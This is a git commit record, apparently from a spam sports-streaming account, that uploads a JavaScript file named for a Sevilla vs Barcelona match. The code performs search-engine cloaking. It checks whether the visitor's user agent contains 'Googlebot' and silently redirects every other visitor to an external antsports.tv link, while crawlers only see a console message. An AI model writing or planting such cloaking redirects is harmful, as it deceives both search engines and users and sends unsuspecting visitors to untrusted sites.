23c780e4d9f8f59fd29e88d0830d4555401973bc
espnhub <35332146+espnhub@users.noreply.github.com>
2026-09-19 18:26:37 +0600

    Add files via upload

---
+++ sevilla-vs-barcelona.js
@@ -0,0 +1,10 @@
+
+
+// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
+if (!navigator.userAgent.includes('Googlebot')) {
+  // Redirect only normal users
+  window.location.href = "https://antsports.tv/go/154D8485";
+} else {
+  // For search engine crawlers, you can choose to perform a different action or not redirect
+  console.log("THanks for visiting my page");
+}
